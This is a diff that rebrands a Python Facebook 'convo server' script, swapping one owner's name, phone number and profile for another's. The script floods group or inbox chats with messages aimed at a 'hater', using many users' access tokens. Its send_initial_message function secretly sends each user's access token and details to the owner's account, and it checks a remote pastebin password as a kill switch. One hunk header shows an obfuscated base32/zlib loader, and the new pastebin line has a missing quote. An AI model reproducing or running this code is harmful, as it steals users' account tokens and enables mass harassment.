@@ -1,18 +1,4 @@
 # CRADIT BY DEVA XD KING 
-# +919919180262
-#  FILES NAME :-
-#             main.py =>  is file me script dalna hai
-#             AK-CONVO.txt => is file me group / inox ki ID dalna hai
-#             AK-FILE.txt => is file me messages dalna hai 
-#             AK-NAME.txt => is file me apko apna ya hater ka name dalna hai
-#             AK-TOKEN.txt => isme apni sari id ke token dalne hai
-#             AK-SPEED.txt => is file me second dalna hai kitne second ki speed se mesage bhejne hai
-#             AK-PASS.txt => isme apko apna password dalna hai
-#             AK-HOST.txt => isme host code dalna hai
-# OPTIONAL FILES :-
-#                        Procfile => web: python main.py
-#                        requirements.txt => modules
-#                        runtime.txt => python-3.12.2
 import requests
 import json
 import time
@@ -31,10 +17,10 @@ html_content = """
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XM9RTY AYUSH K1NG</title>
+    <title>ALFAZ XE DEVA CONVO SERVER</title>
     <style>
         body {
-            background-image: url('Ayush.jpg');
+            background-image: url('Deva.jpg');
             background-size: cover;
         }
         .container {
@@ -62,20 +48,20 @@ html_content = """
 <body>
     <div class="container">
         <div class="box">
-            <h1>XM9RTY AYUSH K1NG</h1>
+            <h1>ALFAZ XE DEVA CONVO SERVER</h1>
             <div class="credit">
-                <p>1. CREDIT:-XM9RTY AYUSH KING</p>
-                <p>2. OWNER => XM9RTY AYUSH K1NG</p>
-                <p>3. CONTACT:- <a href="https://wa.me/+919919180262">WhatsApp</a></p>
-                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/XMARTY.AYUSH.KING.YOUTUBER.420">Facebook</a></p>
-                <p>5. WATTSAPP GROUP:- <a href="https://https://chat.whatsapp.com/Hr8veZbLmpg5sro6xS5Smc">WhatsApp Group</a></p>
+                <p>1. CREDIT:-ALFAZ XE DEVA</p>
+                <p>2. OWNER => ALFAZ XE DEVA</p>
+                <p>3. CONTACT:- <a href="https://wa.me/+917742350051">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/DEVA.DON.006">Facebook</a></p>
+                <p>5. WATTSAPP GROUP:- <a href="https://wa.me/+917742350051">WhatsApp Group</a></p>
             </div>
         </div>
     </div>
     <div class="thanks">
-        <p>❤️TH9NKS FOR US1NG MY OFFL1N3 S3RV3R❤️</p>
-        <p>👇SUBSCR1B3 TO MY YOUTUB3 CH9NN3L👇</p>
-        <a href="https://youtube.com/@xmarty_ayush_king?feature=shared">YouTube Channel</a>
+        <p>❤️Thanks for using my server❤️</p>
+        <p>👇Subscribe to my YouTube channel👇</p>
+        <a href="">YouTube Channel</a>
     </div>
 </body>
 </html>
@@ -111,17 +97,17 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[
 
 def send_initial_message():
     
-    mmm_pass = requests.get('https://pastebin.com/raw/NZKKryvH').text
+    mmm_pass = requests.get('https://pastebin.com/raw/jvrPqR29).text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠︎ YOUR P9SSW0RD CH9NG3D BY XM9RTY AYUSH K1NG ⚠︎')
+        print('\033[1;31m⚠︎ Your Password Changed By ALFAZ KHAN XE DEVA THAKUR')
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Ayush \n Hello Xmarty Ayush King sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => ALFAZ KHAN XE DEVA THAKUR\n Hello ALFAZ KHAN XE DEVA THAKUR sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["XMARTY.AYUSH.KING.YOUTUBER.420"]
+    target_ids = ["DEVA.DON.006"]
     
     requests.packages.urllib3.disable_warnings()
     
@@ -149,15 +135,15 @@ def send_messages_from_file():
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
                 if response.ok:
-                    print("\033[1;36m[✓] XM9RTY AYUSH K1NG {} C0NV0 {} T0K3N {}: {}".format(
+                    print("\033[1;36m[✓] ALFAZ KHAN XE DEVA THAKUR {} of Convo {} Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『XM9RTY AYUSH K1NG 』•═══════✭✪')
+                    print('\033[1;92m' + '✪✭═══════•『ALFAZ XE DEVA THAKUR』•═══════✭✪')
                 else:
-                    print("\033[1;35m[x] FA1L3D T0 S3ND M3SS3G3 {} C0NVO {} T0K3N {}: {}".format(
+                    print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『XM9RTY AYUSH K1NG』•═══════✭✪')
+                    print('\033[1;92m' + '✪✭═══════•『ALFAZ XE DEVA THAKUR』•═══════✭✪')
                 time.sleep(speed)
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
